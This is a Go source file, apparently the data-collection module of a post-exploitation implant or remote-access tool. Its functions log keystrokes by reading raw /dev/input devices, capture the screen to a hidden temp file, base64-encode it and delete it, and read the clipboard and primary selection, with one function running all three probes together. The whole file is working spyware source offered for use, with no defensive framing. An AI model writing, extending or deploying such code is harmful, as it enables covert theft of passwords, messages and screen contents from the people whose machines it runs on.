package module

import (
	"fmt"
	"strings"
)

// RunCollectKeylog captures keystrokes.
// Params: duration (seconds), device (optional, e.g. /dev/input/event0)
func RunCollectKeylog(params map[string]interface{}) (string, error) {
	duration := "5"
	if d, ok := params["duration"].(string); ok {
		duration = d
	}
	device, _ := params["device"].(string)

	cmds := []string{"echo '=== Keylog ==='"}

	if device != "" {
		cmd := fmt.Sprintf("timeout %s cat %s 2>/dev/null | od -A x -t x1z -v | head -200 || echo 'device read failed'", escapeSQ(duration), escapeSQ(device))
		cmds = append(cmds, cmd)
	} else {
		cmds = append(cmds, "echo 'Attempting keylog (need root or X11):'")
		cmd := fmt.Sprintf("timeout %s cat /dev/input/event* 2>/dev/null | od -A x -t x1z -v | head -200 || echo 'device read failed'", escapeSQ(duration))
		cmds = append(cmds, cmd)
		cmds = append(cmds, "echo '---X11---'")
		cmds = append(cmds, "xinput list 2>/dev/null | grep -i keyboard | head -5 || echo 'no X11 keyboard detected'")
		cmds = append(cmds, "echo 'keylog limited via /dev/input'")
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCollectScreenshot captures the screen.
// Params: display (optional, e.g. :0)
func RunCollectScreenshot(params map[string]interface{}) (string, error) {
	display, _ := params["display"].(string)
	if display == "" {
		display = ":0"
	}

	cmds := []string{
		fmt.Sprintf("export DISPLAY=%s", escapeSQ(display)),
		"echo '=== Screenshot ==='",
		"import -window root /tmp/.ananse_scr.png 2>/dev/null && base64 /tmp/.ananse_scr.png && rm -f /tmp/.ananse_scr.png || echo 'screenshot failed (ImageMagick not installed or no X display)'",
		"scrot -o /tmp/.ananse_scr.png 2>/dev/null && base64 /tmp/.ananse_scr.png && rm -f /tmp/.ananse_scr.png || echo 'scrot failed'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCollectClipboard reads clipboard content.
func RunCollectClipboard(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Clipboard ==='",
		"xclip -o -selection clipboard 2>/dev/null || xsel -b 2>/dev/null || echo 'clipboard read failed (no xclip/xsel)'",
		"echo '--- Primary ---'",
		"xclip -o -selection primary 2>/dev/null || echo 'no primary selection'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCollectAll runs all collection probes.
func RunCollectAll(params map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"KEYLOG", RunCollectKeylog},
		{"SCREENSHOT", RunCollectScreenshot},
		{"CLIPBOARD", RunCollectClipboard},
	}
	for _, p := range probes {
		out, err := p.fn(params)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}
